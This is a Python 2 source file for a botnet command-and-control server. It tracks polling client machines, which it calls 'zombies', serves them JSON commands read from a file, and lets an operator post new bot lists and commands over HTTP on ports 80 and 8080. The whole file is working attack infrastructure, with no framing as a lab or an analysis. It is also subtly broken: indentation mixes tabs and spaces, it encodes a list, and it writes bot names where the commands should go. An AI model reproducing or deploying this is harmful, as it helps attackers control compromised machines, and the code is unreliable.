from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import os,  threading,  socket, json, time
from Queue import Queue

bots = []
with open('bots.txt','r') as f:
	lines = f.readlines()
for line in lines:	
	bots.append(line.strip())
print(bots)
zombies = []

class ThreadPoolMixIn(ThreadingMixIn):
   	numThreads = 100
	allow_reuse_address = True
   	def serve_forever(self):
       		self.requests = Queue(self.numThreads)
	        for x in range(self.numThreads):
			t = threading.Thread(target = self.process_request_thread)
		        t.setDaemon(1)
        	    	t.start()
        	while True:
            		self.handle_request()
        	self.server_close()

    	def process_request_thread(self):
        	while True:
            		ThreadingMixIn.process_request_thread(self, *self.requests.get())

    	def handle_request(self):
        	try:
            		request, client_address = self.get_request()
        	except socket.error:
            		return
        	if self.verify_request(request, client_address):
            		self.requests.put((request, client_address))

class Handler(BaseHTTPRequestHandler):
	def do_GET(self):
		global zombies
		if self.path.endswith('commands'):
			try:
	        		self.send_response(200)
            			self.end_headers()
				client_ip = self.client_address[0]
				with open('commands.txt') as f:
					commands = f.readline().strip()
				if 'stop' in commands and client_ip in bots:
					commands = commands.replace('stop','sleep')
				print(commands)
				commands_json = json.loads(commands)
				data = json.dumps({'commands': commands_json})
				self.wfile.write(data.encode())
				zombies = list([zombie for zombie in zombies if zombie['last_seen'] > time.time() - 20])
				current_zombies = [zombie['ip'] for zombie in zombies]
				if client_ip in current_zombies:
					ind = current_zombies.index(client_ip)
					zombies[ind]['last_seen'] = time.time()
					zombies[ind]['command'] = commands
				else:
					zombies.append({'ip': client_ip, 'command': commands, 'last_seen': time.time()})
					
			except IOError:
				self.send_error(404,'File Not Found: %s' % self.path)
			with open('zombies.txt','w') as f:
				for zombie in zombies:
					f.write(json.dumps(zombie) + '\n')

		elif self.path.endswith('zombies'):
			try:
	        		self.send_response(200)
            			self.end_headers()
				data = json.dumps({'zombies': zombies})
				self.wfile.write(zombies.encode())
			except IOError:
				self.send_error(404,'File Not Found: %s' % self.path)

	def do_POST(self):
		global bots
	        self.send_response(200)
        	self.send_header("Content-type", "text/html")
	        self.end_headers()
		content_length = int(self.headers['Content-Length'])
       		post_data = self.rfile.read(content_length)
           	data = json.loads(post_data)
		if self.path.endswith('bots'):
        	    	try:
				with open('bots.txt','w') as f:
	                		bots = data["bots"]
        	        		for bot in bots:
						f.write(bot + '\n')
			except IOError:
				self.send_error(404,'File Not Found: %s' % self.path)

		elif self.path.endswith('commands'):
        	    	try:
				with open('commands.txt','w') as f:
	                		commands = data["commands"]
        	        		for bot in bots:
						f.write(bot + '\n')
			except IOError:
				self.send_error(404,'File Not Found: %s' % self.path)
			
class ThreadedHTTPServer(ThreadPoolMixIn, HTTPServer):
    pass

if __name__ == '__main__':
	print ('Starting servers, use <Ctrl-C> to stop')
	control_server = ThreadedHTTPServer(('', 80), Handler)
	zombie_server = ThreadedHTTPServer(('', 8080), Handler)
	control_server.serve_forever()

